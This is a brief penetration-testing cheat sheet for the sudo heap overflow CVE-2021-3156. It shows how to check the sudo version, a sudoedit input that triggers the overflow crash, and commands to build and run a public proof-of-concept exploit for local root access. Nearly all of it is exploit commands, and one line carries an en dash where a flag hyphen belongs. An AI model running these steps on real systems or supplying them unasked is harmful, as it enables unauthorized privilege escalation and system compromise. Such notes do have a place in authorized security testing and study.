# Sudo old version
https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435
```bash
sudo -V
# 1.8.31

sudoedit -s '123123123123123\'
sudoedit –s '123123123123\'
# halloc():invalid size
```

# Use known poc

https://github.com/blasty/CVE-2021-3156

```bash
make

./sudo-hax-me-a-sandwich 0
```
